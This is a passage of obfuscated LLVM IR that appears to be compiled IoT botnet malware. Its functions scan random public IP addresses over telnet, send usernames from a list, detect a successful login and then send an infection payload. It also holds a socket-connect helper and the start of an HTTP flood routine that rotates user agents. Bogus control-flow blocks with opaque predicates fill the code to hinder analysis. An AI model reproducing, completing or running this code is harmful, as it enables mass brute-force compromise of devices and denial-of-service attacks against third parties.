  %1164 = or i1 %1162, %1163
  br i1 %1164, label %originalBBpart2154, label %originalBB152alteredBB

originalBBpart2154:                               ; preds = %originalBB152
  br i1 %1156, label %1165, label %1166

; <label>:1165:                                   ; preds = %originalBBpart2154
  br label %1166

; <label>:1166:                                   ; preds = %1165, %originalBBpart2154
  %1167 = load i32, i32* %9, align 4
  %1168 = sext i32 %1167 to i64
  %1169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1168
  call void @reset_telstate(%struct.telstate_t* %1169)
  br label %1170

; <label>:1170:                                   ; preds = %1166, %1132
  br label %1171

; <label>:1171:                                   ; preds = %1170, %originalBBpart2134, %778, %originalBBpart2102, %656, %originalBBpart286, %505, %343, %186
  %1172 = load i32, i32* @x.91
  %1173 = load i32, i32* @y.92
  %1174 = sub i32 %1172, 1
  %1175 = mul i32 %1172, %1174
  %1176 = urem i32 %1175, 2
  %1177 = icmp eq i32 %1176, 0
  %1178 = icmp slt i32 %1173, 10
  %1179 = or i1 %1177, %1178
  br i1 %1179, label %originalBB156, label %originalBB156alteredBB

originalBB156:                                    ; preds = %originalBB156alteredBB, %1171
  %1180 = load i32, i32* @x.91
  %1181 = load i32, i32* @y.92
  %1182 = sub i32 %1180, 1
  %1183 = mul i32 %1180, %1182
  %1184 = urem i32 %1183, 2
  %1185 = icmp eq i32 %1184, 0
  %1186 = icmp slt i32 %1181, 10
  %1187 = or i1 %1185, %1186
  br i1 %1187, label %originalBBpart2158, label %originalBB156alteredBB

originalBBpart2158:                               ; preds = %originalBB156
  br label %1188

; <label>:1188:                                   ; preds = %originalBBpart2158, %1021, %913, %774, %762, %690, %652, %640, %552, %487, %originalBBpart272, %308, %277, %264
  %1189 = load i32, i32* %9, align 4
  %1190 = add nsw i32 %1189, 1
  store i32 %1190, i32* %9, align 4
  br label %137

; <label>:1191:                                   ; preds = %originalBBpart241
  br label %119
                                                  ; No predecessors!
  %1193 = load i32, i32* @x.91
  %1194 = load i32, i32* @y.92
  %1195 = sub i32 %1193, 1
  %1196 = mul i32 %1193, %1195
  %1197 = urem i32 %1196, 2
  %1198 = icmp eq i32 %1197, 0
  %1199 = icmp slt i32 %1194, 10
  %1200 = or i1 %1198, %1199
  br i1 %1200, label %originalBB160, label %originalBB160alteredBB

originalBB160:                                    ; preds = %originalBB160alteredBB, %1192
  %1201 = load i32, i32* @x.91
  %1202 = load i32, i32* @y.92
  %1203 = sub i32 %1201, 1
  %1204 = mul i32 %1201, %1203
  %1205 = urem i32 %1204, 2
  %1206 = icmp eq i32 %1205, 0
  %1207 = icmp slt i32 %1202, 10
  %1208 = or i1 %1206, %1207
  br i1 %1208, label %originalBBpart2162, label %originalBB160alteredBB

originalBBpart2162:                               ; preds = %originalBB160
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %1209 = alloca i32, align 4
  %1210 = alloca i32, align 4
  %1211 = alloca i32, align 4
  %1212 = alloca i32, align 4
  %1213 = alloca [128 x i8], align 16
  %1214 = alloca i8, align 1
  %1215 = alloca i32, align 4
  %1216 = alloca i32, align 4
  %1217 = alloca i32, align 4
  %1218 = alloca %struct.__sigset_t, align 8
  %1219 = alloca %struct.timeval, align 8
  %1220 = alloca i32, align 4
  %1221 = alloca i32, align 4
  %1222 = alloca [256 x i8], align 16
  %1223 = alloca i8*, align 8
  %1224 = alloca %struct.sockaddr_in, align 4
  %1225 = alloca i8*, align 8
  %1226 = alloca i8*, align 8
  %1227 = alloca i32, align 4
  %1228 = alloca i32, align 4
  store i32 10, i32* %1215, align 4
  store i32 1000, i32* %1216, align 4
  %1229 = load i32, i32* %1216, align 4
  store i32 %1229, i32* %1217, align 4
  %1230 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1231 = call i32 @rand_cmwc()
  %_ = sub i32 0, %1230
  %gen = add i32 %_, %1231
  %_1 = sub i32 0, %1230
  %gen2 = add i32 %_1, %1231
  %_3 = shl i32 %1230, %1231
  %_4 = sub i32 %1230, %1231
  %gen5 = mul i32 %_4, %1231
  %1232 = xor i32 %1230, %1231
  call void @srand(i32 %1232) #5
  %1233 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1224, i32 0, i32 0
  store i16 2, i16* %1233, align 4
  %1234 = call zeroext i16 @htons(i16 zeroext 23) #13
  %1235 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1224, i32 0, i32 1
  store i16 %1234, i16* %1235, align 2
  %1236 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1224, i32 0, i32 3
  %1237 = getelementptr inbounds [8 x i8], [8 x i8]* %1236, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1237, i8 0, i64 8, i32 4, i1 false)
  %1238 = call noalias i8* @malloc(i64 513) #5
  store i8* %1238, i8** %1223, align 8
  %1239 = load i8*, i8** %1223, align 8
  call void @llvm.memset.p0i8.i64(i8* %1239, i8 0, i64 513, i32 1, i1 false)
  %1240 = load i32, i32* %1217, align 4
  %1241 = zext i32 %1240 to i64
  %1242 = call i8* @llvm.stacksave()
  store i8* %1242, i8** %1225, align 8
  %1243 = alloca %struct.telstate_t, i64 %1241, align 16
  %1244 = bitcast %struct.telstate_t* %1243 to i8*
  %1245 = load i32, i32* %1217, align 4
  %1246 = sext i32 %1245 to i64
  %_6 = shl i64 %1246, 5
  %_7 = sub i64 %1246, 5
  %gen8 = mul i64 %_7, 5
  %_9 = sub i64 0, %1246
  %gen10 = add i64 %_9, 5
  %_11 = shl i64 %1246, 5
  %_12 = sub i64 %1246, 5
  %gen13 = mul i64 %_12, 5
  %_14 = shl i64 %1246, 5
  %_15 = sub i64 %1246, 5
  %gen16 = mul i64 %_15, 5
  %_17 = sub i64 0, %1246
  %gen18 = add i64 %_17, 5
  %_19 = shl i64 %1246, 5
  %1247 = mul i64 %1246, 5
  call void @llvm.memset.p0i8.i64(i8* %1244, i8 0, i64 %1247, i32 16, i1 false)
  store i32 0, i32* %1209, align 4
  br label %originalBB

originalBB20alteredBB:                            ; preds = %originalBB20, %74
  %1248 = load i32, i32* %9, align 4
  %_21 = sub i32 %1248, 1
  %gen22 = mul i32 %_21, 1
  %1249 = add nsw i32 %1248, 1
  store i32 %1249, i32* %9, align 4
  br label %originalBB20

originalBB26alteredBB:                            ; preds = %originalBB26, %94
  %1250 = load i32, i32* %11, align 4
  %_27 = sub i32 0, %1250
  %gen28 = add i32 %_27, 1
  %_29 = sub i32 0, %1250
  %gen30 = add i32 %_29, 1
  %_31 = shl i32 %1250, 1
  %1251 = add nsw i32 %1250, 1
  store i32 %1251, i32* %11, align 4
  %1252 = sext i32 %1251 to i64
  %1253 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %1252
  %1254 = load i8*, i8** %1253, align 8
  %1255 = icmp ne i8* %1254, null
  br label %originalBB26

originalBB35alteredBB:                            ; preds = %originalBB35, %119
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %137
  %1256 = load i32, i32* %9, align 4
  %1257 = load i32, i32* %17, align 4
  %1258 = icmp slt i32 %1256, %1257
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %164
  %1259 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1260 = load i32, i32* %9, align 4
  %1261 = sext i32 %1260 to i64
  %1262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1261
  %1263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1262, i32 0, i32 7
  store i32 %1259, i32* %1263, align 16
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %200
  %1264 = load i32, i32* %9, align 4
  %1265 = sext i32 %1264 to i64
  %1266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1265
  %1267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1266, i32 0, i32 9
  %1268 = load i8*, i8** %1267, align 8
  store i8* %1268, i8** %26, align 8
  %1269 = load i32, i32* %9, align 4
  %1270 = sext i32 %1269 to i64
  %1271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1270
  %1272 = bitcast %struct.telstate_t* %1271 to i8*
  call void @llvm.memset.p0i8.i64(i8* %1272, i8 0, i64 32, i32 16, i1 false)
  %1273 = load i8*, i8** %26, align 8
  %1274 = load i32, i32* %9, align 4
  %1275 = sext i32 %1274 to i64
  %1276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1275
  %1277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1276, i32 0, i32 9
  store i8* %1273, i8** %1277, align 8
  %1278 = call i32 @getRandomPublicIP()
  %1279 = load i32, i32* %9, align 4
  %1280 = sext i32 %1279 to i64
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1280
  %1282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1281, i32 0, i32 1
  store i32 %1278, i32* %1282, align 4
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %388
  store i32 4, i32* %20, align 4
  store i32 0, i32* %21, align 4
  %1283 = load i32, i32* %9, align 4
  %1284 = sext i32 %1283 to i64
  %1285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1284
  %1286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1285, i32 0, i32 0
  %1287 = load i32, i32* %1286, align 16
  %1288 = bitcast i32* %21 to i8*
  %1289 = call i32 @getsockopt(i32 %1287, i32 1, i32 4, i8* %1288, i32* %20) #5
  %1290 = load i32, i32* %21, align 4
  %1291 = icmp ne i32 %1290, 0
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %414
  %1292 = load i32, i32* %9, align 4
  %1293 = sext i32 %1292 to i64
  %1294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1293
  call void @reset_telstate(%struct.telstate_t* %1294)
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %434
  %1295 = load i32, i32* %9, align 4
  %1296 = sext i32 %1295 to i64
  %1297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1296
  %1298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1297, i32 0, i32 0
  %1299 = load i32, i32* %1298, align 16
  %1300 = load i32, i32* %9, align 4
  %1301 = sext i32 %1300 to i64
  %1302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1301
  %1303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1302, i32 0, i32 0
  %1304 = load i32, i32* %1303, align 16
  %1305 = call i32 (i32, i32, ...) @fcntl(i32 %1304, i32 3, i8* null)
  %_60 = shl i32 %1305, -2049
  %_61 = sub i32 %1305, -2049
  %gen62 = mul i32 %_61, -2049
  %_63 = sub i32 0, %1305
  %gen64 = add i32 %_63, -2049
  %_65 = sub i32 %1305, -2049
  %gen66 = mul i32 %_65, -2049
  %1306 = and i32 %1305, -2049
  %1307 = call i32 (i32, i32, ...) @fcntl(i32 %1299, i32 4, i32 %1306)
  %1308 = load i32, i32* %9, align 4
  %1309 = sext i32 %1308 to i64
  %1310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1309
  call void @advance_state(%struct.telstate_t* %1310, i32 2)
  br label %originalBB59

originalBB70alteredBB:                            ; preds = %originalBB70, %467
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %528
  %1311 = load i32, i32* %9, align 4
  %1312 = sext i32 %1311 to i64
  %1313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1312
  call void @advance_state(%struct.telstate_t* %1313, i32 0)
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %553
  %1314 = load i32, i32* %9, align 4
  %1315 = sext i32 %1314 to i64
  %1316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1315
  %1317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1316, i32 0, i32 7
  %1318 = load i32, i32* %1317, align 16
  %_79 = sub i32 0, %1318
  %gen80 = add i32 %_79, 3
  %1319 = add i32 %1318, 3
  %1320 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1321 = icmp ult i32 %1319, %1320
  br label %originalBB78

originalBB84alteredBB:                            ; preds = %originalBB84, %582
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %599
  %1322 = load i32, i32* %9, align 4
  %1323 = sext i32 %1322 to i64
  %1324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1323
  %1325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1324, i32 0, i32 0
  %1326 = load i32, i32* %1325, align 16
  %1327 = load i32, i32* %9, align 4
  %1328 = sext i32 %1327 to i64
  %1329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1328
  %1330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1329, i32 0, i32 4
  %1331 = load i8, i8* %1330, align 2
  %1332 = zext i8 %1331 to i64
  %1333 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %1332
  %1334 = load i8*, i8** %1333, align 8
  %1335 = load i32, i32* %9, align 4
  %1336 = sext i32 %1335 to i64
  %1337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1336
  %1338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1337, i32 0, i32 4
  %1339 = load i8, i8* %1338, align 2
  %1340 = zext i8 %1339 to i64
  %1341 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %1340
  %1342 = load i8*, i8** %1341, align 8
  %1343 = call i64 @strlen(i8* %1342) #10
  %1344 = call i64 @send(i32 %1326, i8* %1334, i64 %1343, i32 16384)
  %1345 = icmp slt i64 %1344, 0
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %691
  %1346 = load i32, i32* %9, align 4
  %1347 = sext i32 %1346 to i64
  %1348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1347
  %1349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1348, i32 0, i32 7
  %1350 = load i32, i32* %1349, align 16
  %_93 = shl i32 %1350, 6
  %_94 = shl i32 %1350, 6
  %_95 = sub i32 0, %1350
  %gen96 = add i32 %_95, 6
  %1351 = add i32 %1350, 6
  %1352 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1353 = icmp ult i32 %1351, %1352
  br label %originalBB92

originalBB100alteredBB:                           ; preds = %originalBB100, %720
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %782
  %1354 = load i32, i32* %9, align 4
  %1355 = sext i32 %1354 to i64
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1355
  %1357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1356, i32 0, i32 0
  %1358 = load i32, i32* %1357, align 16
  %1359 = load i32, i32* %15, align 4
  %1360 = load i32, i32* %9, align 4
  %1361 = sext i32 %1360 to i64
  %1362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1361
  %1363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1362, i32 0, i32 9
  %1364 = load i8*, i8** %1363, align 8
  %1365 = call i32 @read_until_response(i32 %1358, i32 %1359, i8* %1364, i32 512, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %1366 = icmp ne i32 %1365, 0
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %829
  %1367 = load i32, i32* %9, align 4
  %1368 = sext i32 %1367 to i64
  %1369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1368
  %1370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1369, i32 0, i32 9
  %1371 = load i8*, i8** %1370, align 8
  %1372 = call i32 @contains_success(i8* %1371)
  %1373 = icmp ne i32 %1372, 0
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %896
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %914
  %1374 = load i32, i32* %9, align 4
  %1375 = sext i32 %1374 to i64
  %1376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1375
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1376, i32 0, i32 7
  %1378 = load i32, i32* %1377, align 16
  %_117 = sub i32 %1378, 7
  %gen118 = mul i32 %_117, 7
  %_119 = sub i32 %1378, 7
  %gen120 = mul i32 %_119, 7
  %_121 = sub i32 0, %1378
  %gen122 = add i32 %_121, 7
  %_123 = sub i32 0, %1378
  %gen124 = add i32 %_123, 7
  %_125 = shl i32 %1378, 7
  %_126 = sub i32 0, %1378
  %gen127 = add i32 %_126, 7
  %_128 = shl i32 %1378, 7
  %1379 = add i32 %1378, 7
  %1380 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1381 = icmp ult i32 %1379, %1380
  br label %originalBB116

originalBB132alteredBB:                           ; preds = %originalBB132, %943
  br label %originalBB132

originalBB136alteredBB:                           ; preds = %originalBB136, %983
  %1382 = load i32, i32* %9, align 4
  %1383 = sext i32 %1382 to i64
  %1384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1383
  %1385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1384, i32 0, i32 0
  %1386 = load i32, i32* %1385, align 16
  %1387 = load i8*, i8** @infect, align 8
  %1388 = load i8*, i8** @infect, align 8
  %1389 = call i64 @strlen(i8* %1388) #10
  %1390 = call i64 @send(i32 %1386, i8* %1387, i64 %1389, i32 16384)
  %1391 = icmp slt i64 %1390, 0
  br label %originalBB136

originalBB140alteredBB:                           ; preds = %originalBB140, %1025
  br label %originalBB140

originalBB144alteredBB:                           ; preds = %originalBB144, %1042
  %1392 = load i32, i32* %9, align 4
  %1393 = sext i32 %1392 to i64
  %1394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1393
  %1395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1394, i32 0, i32 0
  %1396 = load i32, i32* %1395, align 16
  %1397 = load i32, i32* %15, align 4
  %1398 = load i32, i32* %9, align 4
  %1399 = sext i32 %1398 to i64
  %1400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1399
  %1401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1400, i32 0, i32 9
  %1402 = load i8*, i8** %1401, align 8
  %1403 = call i32 @read_until_response(i32 %1396, i32 %1397, i8* %1402, i32 512, i8** getelementptr inbounds ([1 x i8*], [1 x i8*]* @infected, i32 0, i32 0))
  %1404 = icmp ne i32 %1403, 0
  br label %originalBB144

originalBB148alteredBB:                           ; preds = %originalBB148, %1115
  br label %originalBB148

originalBB152alteredBB:                           ; preds = %originalBB152, %1141
  %1405 = load i32, i32* %9, align 4
  %1406 = sext i32 %1405 to i64
  %1407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1406
  %1408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1407, i32 0, i32 3
  %1409 = load i8, i8* %1408, align 1
  %1410 = zext i8 %1409 to i32
  %1411 = icmp ne i32 %1410, 3
  br label %originalBB152

originalBB156alteredBB:                           ; preds = %originalBB156, %1171
  br label %originalBB156

originalBB160alteredBB:                           ; preds = %originalBB160, %1192
  br label %originalBB160
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %30

; <label>:13:                                     ; preds = %2
  %14 = load i32, i32* @x.93
  %15 = load i32, i32* @y.94
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  store i32 0, i32* %3, align 4
  %22 = load i32, i32* @x.93
  %23 = load i32, i32* @y.94
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %93

; <label>:30:                                     ; preds = %2
  %31 = load i32, i32* @x.93
  %32 = load i32, i32* @y.94
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  %39 = load %struct.hostent*, %struct.hostent** %6, align 8
  %40 = getelementptr inbounds %struct.hostent, %struct.hostent* %39, i32 0, i32 4
  %41 = load i8**, i8*** %40, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 0
  %43 = load i8*, i8** %42, align 8
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %45 = bitcast %struct.in_addr* %44 to i8*
  %46 = load %struct.hostent*, %struct.hostent** %6, align 8
  %47 = getelementptr inbounds %struct.hostent, %struct.hostent* %46, i32 0, i32 3
  %48 = load i32, i32* %47, align 4
  %49 = sext i32 %48 to i64
  call void @bcopy(i8* %43, i8* %45, i64 %49) #5
  %50 = load i16, i16* %5, align 2
  %51 = call zeroext i16 @htons(i16 zeroext %50) #13
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %51, i16* %52, align 2
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %53, align 4
  %54 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %54, i32* %9, align 4
  %55 = load i32, i32* %9, align 4
  %56 = bitcast i32* %8 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 6, i32 1, i8* %56, i32 4) #5
  %58 = load i32, i32* %9, align 4
  %59 = icmp eq i32 %58, -1
  %60 = load i32, i32* @x.93
  %61 = load i32, i32* @y.94
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %59, label %68, label %85

; <label>:68:                                     ; preds = %originalBBpart24
  %69 = load i32, i32* @x.93
  %70 = load i32, i32* @y.94
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  store i32 0, i32* %3, align 4
  %77 = load i32, i32* @x.93
  %78 = load i32, i32* @y.94
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %93

; <label>:85:                                     ; preds = %originalBBpart24
  %86 = load i32, i32* %9, align 4
  %87 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %88 = call i32 @connect(i32 %86, %struct.sockaddr* %87, i32 16)
  %89 = icmp eq i32 %88, -1
  br i1 %89, label %90, label %91

; <label>:90:                                     ; preds = %85
  store i32 0, i32* %3, align 4
  br label %93

; <label>:91:                                     ; preds = %85
  %92 = load i32, i32* %9, align 4
  store i32 %92, i32* %3, align 4
  br label %93

; <label>:93:                                     ; preds = %91, %90, %originalBBpart28, %originalBBpart2
  %94 = load i32, i32* @x.93
  %95 = load i32, i32* @y.94
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %93
  %102 = load i32, i32* %3, align 4
  %103 = load i32, i32* @x.93
  %104 = load i32, i32* @y.94
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret i32 %102

originalBBalteredBB:                              ; preds = %originalBB, %13
  store i32 0, i32* %3, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  %111 = load %struct.hostent*, %struct.hostent** %6, align 8
  %112 = getelementptr inbounds %struct.hostent, %struct.hostent* %111, i32 0, i32 4
  %113 = load i8**, i8*** %112, align 8
  %114 = getelementptr inbounds i8*, i8** %113, i64 0
  %115 = load i8*, i8** %114, align 8
  %116 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %117 = bitcast %struct.in_addr* %116 to i8*
  %118 = load %struct.hostent*, %struct.hostent** %6, align 8
  %119 = getelementptr inbounds %struct.hostent, %struct.hostent* %118, i32 0, i32 3
  %120 = load i32, i32* %119, align 4
  %121 = sext i32 %120 to i64
  call void @bcopy(i8* %115, i8* %117, i64 %121) #5
  %122 = load i16, i16* %5, align 2
  %123 = call zeroext i16 @htons(i16 zeroext %122) #13
  %124 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %123, i16* %124, align 2
  %125 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %125, align 4
  %126 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %126, i32* %9, align 4
  %127 = load i32, i32* %9, align 4
  %128 = bitcast i32* %8 to i8*
  %129 = call i32 @setsockopt(i32 %127, i32 6, i32 1, i8* %128, i32 4) #5
  %130 = load i32, i32* %9, align 4
  %131 = icmp eq i32 %130, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  store i32 0, i32* %3, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %93
  %132 = load i32, i32* %3, align 4
  br label %originalBB10
}

declare %struct.hostent* @gethostbyname(i8*) #4

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #2

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [62 x i8*], align 16
  %14 = alloca [3 x i8*], align 16
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = bitcast [62 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %19, i8* bitcast ([62 x i8*]* @sendHTTP.useragents to i8*), i64 496, i32 16, i1 false)
  %20 = bitcast [3 x i8*]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %20, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %21 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %21, %22
  store i32 %23, i32* %16, align 4
  %24 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %25 = load i8*, i8** %8, align 8
  %26 = load i8*, i8** %10, align 8
  %27 = call i32 @rand() #5
  %28 = srem i32 %27, 3
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [3 x i8*], [3 x i8*]* %14, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @rand() #5
  %33 = srem i32 %32, 65
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [62 x i8*], [62 x i8*]* %13, i64 0, i64 %34
  %36 = load i8*, i8** %35, align 8
